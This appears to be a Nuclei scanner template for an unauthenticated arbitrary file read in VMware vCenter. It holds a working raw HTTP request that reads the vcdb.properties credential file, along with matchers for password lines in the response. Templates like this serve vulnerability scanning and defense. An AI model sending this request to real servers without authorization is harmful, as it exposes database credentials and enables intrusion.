id: vmware-vcenter-lfi2
info:
  author: dwisiswant0
  name: VMware vCenter Unauthenticated Arbitrary File Read
  reference: '- https://kb.vmware.com/s/article/7960893

    - https://twitter.com/ptswarm/status/1316016337550938122

    '
  severity: high
  tags: vmware,lfi
requests:
- matchers:
  - part: body
    regex:
    - (?m)^(driver|dbtype|password(\.encrypted)?)\s=
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /eam/vib?id=C:\\Documents+and+Settings\\All+Users\\Application+Data\\VMware\\VMware+VirtualCenter\vcdb.properties
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
    Firefox/55

    Accept: */*

    Accept-Language: en

    Connection: close

    '
